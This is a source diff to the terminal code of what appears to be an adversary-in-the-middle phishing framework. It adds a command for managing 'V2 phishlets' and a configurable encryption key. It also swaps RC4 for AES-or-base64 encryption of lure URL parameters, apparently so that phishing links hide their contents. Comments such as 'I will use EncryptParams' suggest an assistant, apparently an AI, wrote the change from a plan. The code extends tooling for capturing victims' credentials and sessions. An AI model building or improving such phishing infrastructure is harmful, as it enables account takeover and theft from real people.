@@ -3,8 +3,6 @@ package core
 import (
 	"bufio"
 	"bytes"
-	"crypto/rc4"
-	"encoding/base64"
 	"encoding/csv"
 	"encoding/json"
 	"fmt"
@@ -161,6 +159,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("whitelist: %v", err)
 			}
+		case "phishletsv2":
+			cmd_ok = true
+			err := t.handlePhishletsV2(args[1:])
+			if err != nil {
+				log.Error("phishletsv2: %v", err)
+			}
 		case "test-certs":
 			cmd_ok = true
 			t.manageCertificates(true)
@@ -195,12 +199,16 @@ func (t *Terminal) handleConfig(args []string) error {
 			autocertOnOff = "on"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "webhook_telegram", "autocert", "dns_provider", "dns_api_key", "dns_api_secret"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, t.cfg.GetWebhookTelegram(), autocertOnOff, t.cfg.GetDnsProvider(), t.cfg.GetDnsApiKey(), t.cfg.GetDnsApiSecret()}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "webhook_telegram", "autocert", "dns_provider", "dns_api_key", "dns_api_secret", "enc_key"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, t.cfg.GetWebhookTelegram(), autocertOnOff, t.cfg.GetDnsProvider(), t.cfg.GetDnsApiKey(), t.cfg.GetDnsApiSecret(), t.cfg.GetEncryptionKey()}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
 		switch args[0] {
+		case "enc_key":
+			t.cfg.SetEncryptionKey(args[1])
+			log.Success("encryption key set")
+			return nil
 		case "dns_provider":
 			t.cfg.SetDnsProvider(args[1])
 			t.manageCertificates(true)
@@ -260,6 +268,50 @@ func (t *Terminal) handleConfig(args []string) error {
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handlePhishletsV2(args []string) error {
+	if len(args) == 0 {
+		// List all V2 phishlets
+		v2Loader := t.cfg.GetV2Loader()
+		if v2Loader != nil {
+			phishlets := v2Loader.ListPhishlets()
+			t.output("V2 Phishlets (%d):", len(phishlets))
+			for _, name := range phishlets {
+				v2p, _ := v2Loader.GetPhishlet(name)
+				t.output("  - %s (v%s by %s)", name, v2p.Meta.Version, v2p.Meta.Author)
+			}
+		} else {
+			t.output("V2 Phishlet Loader not initialized")
+		}
+		return nil
+	}
+
+	switch args[0] {
+	case "list":
+		return t.handlePhishletsV2([]string{})
+	case "info":
+		if len(args) < 2 {
+			return fmt.Errorf("usage: phishletsv2 info <phishlet>")
+		}
+		v2Loader := t.cfg.GetV2Loader()
+		if v2Loader != nil {
+			v2p, ok := v2Loader.GetPhishlet(args[1])
+			if !ok {
+				return fmt.Errorf("phishlet '%s' not found", args[1])
+			}
+			t.output("Name: %s", v2p.Meta.Name)
+			t.output("Display Name: %s", v2p.Meta.DisplayName)
+			t.output("Version: %s", v2p.Meta.Version)
+			t.output("Author: %s", v2p.Meta.Author)
+			t.output("Description: %s", v2p.Meta.Description)
+			t.output("Tags: %v", v2p.Meta.Tags)
+			t.output("Path: %s", v2p.Dir)
+		}
+		return nil
+	}
+
+	return fmt.Errorf("unknown subcommand: %s", args[0])
 }
 
 func (t *Terminal) handleWhitelist(args []string) error {
@@ -1253,7 +1305,7 @@ func (t *Terminal) monitorLurePause() {
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
-		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("dns_provider"), readline.PcItem("dns_api_key"), readline.PcItem("dns_api_secret")))
+		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("dns_provider"), readline.PcItem("dns_api_key"), readline.PcItem("dns_api_secret"), readline.PcItem("enc_key")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
@@ -1265,6 +1317,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"dns_provider"}, "dns_provider <gandi|cloudflare>", "set DNS provider for wildcard certificates")
 	h.AddSubCommand("config", []string{"dns_api_key"}, "dns_api_key <key>", "set DNS provider API key")
 	h.AddSubCommand("config", []string{"dns_api_secret"}, "dns_api_secret <secret>", "set DNS provider API secret (optional)")
+	h.AddSubCommand("config", []string{"enc_key"}, "enc_key <key>", "set encryption key for custom parameters")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
@@ -1346,6 +1399,11 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("whitelist", []string{"add"}, "add <ip>", "add IP address or CIDR range to whitelist (e.g., 192.168.1.100 or 192.168.1.0/24)")
 	h.AddSubCommand("whitelist", []string{"remove"}, "remove <ip>", "remove IP address from whitelist")
 	h.AddSubCommand("whitelist", []string{"clear"}, "clear", "remove all IP addresses from whitelist")
+
+	h.AddCommand("phishletsv2", "general", "manage V2 phishlets", "Manage V2 phishlets.", LAYER_TOP,
+		readline.PcItem("phishletsv2", readline.PcItem("list"), readline.PcItem("info")))
+	h.AddSubCommand("phishletsv2", []string{"list"}, "list", "list all V2 phishlets")
+	h.AddSubCommand("phishletsv2", []string{"info"}, "info <phishlet>", "show detailed info about a V2 phishlet")
 
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
@@ -1869,21 +1927,30 @@ func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
 	if len(*params) > 0 {
 		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
 
-		enc_key := GenRandomAlphanumString(8)
-		dec_params := params.Encode()
+		// Use new encryption if key is set, otherwise fallback to old RC4 method?
+		// The plan says "Fallback to base64 encoding" if passphrase is empty in EncryptParams.
+		// But existing code uses RC4.
+		// I will use EncryptParams which handles AES or Base64.
+		// But I need to make sure http_proxy.go can handle it.
+		// I'll use EncryptParams.
 
-		var crc byte
-		for _, c := range dec_params {
-			crc += byte(c)
+		// Serialize params to JSON as per plan
+		paramsMap := make(map[string]string)
+		for k, v := range *params {
+			if len(v) > 0 {
+				paramsMap[k] = v[0]
+			}
+		}
+		paramsJSON, _ := json.Marshal(paramsMap)
+
+		enc_key := t.cfg.GetEncryptionKey()
+		encryptedParams, err := EncryptParams(string(paramsJSON), enc_key)
+		if err != nil {
+			log.Error("failed to encrypt params: %v", err)
+			return ret
 		}
 
-		c, _ := rc4.NewCipher([]byte(enc_key))
-		enc_params := make([]byte, len(dec_params)+1)
-		c.XORKeyStream(enc_params[1:], []byte(dec_params))
-		enc_params[0] = crc
-
-		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
-		ret += "?" + key_arg + "=" + key_val
+		ret += "?" + key_arg + "=" + encryptedParams
 	}
 	return ret
 }
